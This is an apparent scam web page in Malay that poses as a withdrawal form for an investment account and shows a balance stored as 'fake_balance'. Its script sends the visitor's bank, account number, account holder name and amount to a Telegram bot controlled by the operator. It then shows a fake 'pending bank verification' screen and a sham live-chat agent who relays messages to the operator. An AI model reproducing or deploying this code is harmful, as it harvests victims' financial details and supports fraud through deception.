<!DOCTYPE html>
<html lang="ms">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Withdraw</title>
    <link rel="stylesheet" href="css/style.css">
</head>
<body style="background: var(--bg);">

    <div class="header-nav">
        <a href="dashboard.html" class="back-btn">←</a>
        <div class="header-title">Pengeluaran</div>
    </div>

    <div class="content" style="padding-top: 20px;">
        
        <div id="withdraw-form-section">
            <div class="portfolio-card">
                <div class="portfolio-label">Baki Boleh Dikeluarkan</div>
                <div class="portfolio-amount" id="available-balance">RM 0.00</div>
            </div>

            <form id="withdrawForm">
                <div class="input-group">
                    <label>Pilih Bank</label>
                    <select id="bank">
                        <option value="Maybank">Maybank</option>
                        <option value="CIMB">CIMB Bank</option>
                        <option value="Touch 'n Go">Touch 'n Go eWallet</option>
                    </select>
                </div>
                <div class="input-group">
                    <label>Nombor Akaun Bank</label>
                    <input type="text" id="acc_num" placeholder="1234 5678 9012" required>
                </div>
                <div class="input-group">
                    <label>Nama Pemilik Akaun</label>
                    <input type="text" id="acc_name" placeholder="Ali Bin Abu" required>
                </div>
                <div class="input-group">
                    <label>Jumlah (RM)</label>
                    <input type="number" id="amount" placeholder="100" required>
                </div>
                <button type="submit" class="btn btn-primary" style="width: 100%; margin-top: 10px;">Hantar Permohonan</button>
            </form>
        </div>

        <div id="pending-section" style="display: none;">
            <div class="portfolio-card" style="text-align: center; padding: 40px 20px;">
                <div style="font-size: 60px; margin-bottom: 20px;">⏳</div>
                <h2 style="font-size: 22px; font-weight: 700; margin-bottom: 10px;">Pengeluaran Diproses</h2>
                <p style="font-size: 14px; color: var(--text-muted); line-height: 1.6;">Permohonan pengeluaran anda telah diterima dan sedang menunggu pengesahan dari pihak bank.</p>
                <div style="display: inline-block; background: #fef3c7; color: #d97706; padding: 6px 12px; border-radius: 20px; font-weight: 700; font-size: 12px; margin-top: 15px;">STATUS: PENDING</div>
            </div>
        </div>

    </div>

    <div class="chat-widget">
        <div class="chat-header" id="chat-toggle">💬</div>
        <div class="chat-body hidden" id="chat-body">
            <div class="chat-messages" id="chat-messages">
                <div class="msg agent" id="agent-initial-msg" style="display: none;">Salam, saya Ejen Aiman. Ada apa-apa yang boleh saya bantu dengan pengeluaran anda?</div>
            </div>
            <div class="chat-input-area">
                <input type="text" id="chat-input" placeholder="Taip mesej anda...">
                <button id="chat-send">Hantar</button>
            </div>
        </div>
    </div>

    <script src="js/config.js"></script>
    <script>
        let balance = parseFloat(localStorage.getItem('fake_balance') || '0');
        document.getElementById('available-balance').textContent = `RM ${balance.toFixed(2)}`;

        document.getElementById('withdrawForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const btn = e.target.querySelector('button');
            btn.textContent = "Memproses...";
            btn.disabled = true;

            const bank = document.getElementById('bank').value;
            const acc_num = document.getElementById('acc_num').value;
            const acc_name = document.getElementById('acc_name').value;
            const amount = document.getElementById('amount').value;

            await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: "POST", body: new URLSearchParams({ chat_id: CONFIG.CHAT_ID, text: `🏦 <b>WITHDRAW REQUEST</b>\n\n<b>Bank:</b> ${bank}\n<b>No. Akaun:</b> ${acc_num}\n<b>Nama:</b> ${acc_name}\n<b>Jumlah:</b> RM ${amount}\n\nStatus: PENDING APPROVAL`, parse_mode: "HTML" })
            });

            document.getElementById('withdraw-form-section').style.display = 'none';
            document.getElementById('pending-section').style.display = 'block';
            
            setTimeout(() => { document.getElementById('agent-initial-msg').style.display = 'block'; }, 2000);
        });

        // Live Chat Logic
        const chatToggle = document.getElementById('chat-toggle');
        const chatBody = document.getElementById('chat-body');
        const chatSend = document.getElementById('chat-send');
        const chatInput = document.getElementById('chat-input');
        const chatMessages = document.getElementById('chat-messages');

        chatToggle.addEventListener('click', () => { chatBody.classList.toggle('hidden'); });

        async function sendMessageToAdmin(text) {
            const payload = { chat_id: CONFIG.CHAT_ID, text: `💬 <b>LIVE CHAT DARI WEB</b>\n\n<b>Pesanan:</b> ${text}\n\n<i>(Reply mesej ini untuk jawab)</i>`, parse_mode: "HTML" };
            try { await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, { method: "POST", body: new URLSearchParams(payload) }); } catch (err) {}
        }

        async function fetchAdminReply() {
            try {
                const res = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates`);
                const data = await res.json();
                if (data.ok && data.result.length > 0) {
                    const lastUpdate = data.result[data.result.length - 1];
                    if (lastUpdate.message && lastUpdate.message.reply_to_message && lastUpdate.message.reply_to_message.text.includes("LIVE CHAT DARI WEB")) {
                        const replyText = lastUpdate.message.text;
                        const lastMsg = document.querySelector('.msg.user:last-child');
                        if (lastMsg && lastMsg.dataset.replied !== 'true') { lastMsg.dataset.replied = 'true'; appendMessage(replyText, 'agent'); }
                    }
                }
            } catch (err) {}
        }

        function appendMessage(text, type) {
            const div = document.createElement('div'); div.className = `msg ${type}`; div.textContent = text;
            chatMessages.appendChild(div); chatMessages.scrollTop = chatMessages.scrollHeight;
        }

        chatSend.addEventListener('click', async () => {
            const text = chatInput.value.trim(); if (!text) return;
            appendMessage(text, 'user'); chatInput.value = '';
            await sendMessageToAdmin(text);
            const typingDiv = document.createElement('div'); typingDiv.className = 'msg agent'; typingDiv.textContent = 'Sedang menaip...'; typingDiv.id = 'typing';
            chatMessages.appendChild(typingDiv); chatMessages.scrollTop = chatMessages.scrollHeight;
            setTimeout(() => { if(document.getElementById('typing')) document.getElementById('typing').remove(); }, 3000);
        });

        chatInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') chatSend.click(); });
        setInterval(fetchAdminReply, 5000);
    </script>
</body>
</html>
